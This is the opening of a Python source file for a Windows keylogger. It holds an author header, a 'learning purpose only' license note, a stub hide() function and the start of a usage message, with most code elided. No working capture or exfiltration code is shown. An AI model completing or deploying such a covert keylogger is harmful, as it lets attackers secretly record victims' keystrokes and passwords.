'''
SimplePython Keylogger for Windows
====================================
Coded By: srinivasan<srini.yudiar@gmail.com>
Git Hub :https://github.com/srinitechie/winpykeylogr.git
FEATURES
========
...
NOTE: YOU ARE FREE TO COPY,MODIFY,REUSE THE SOURCE CODE FOR LEARNING PURPOSE ONLY.
'''
try:
...
def hide():
    ...
    return True
def msg():
    print """Simple Python Keylogger for Windows
Coded By: srinivasan<srini.yudiar@gmail.com>
usage:winpykeylogr.py mode
mode:
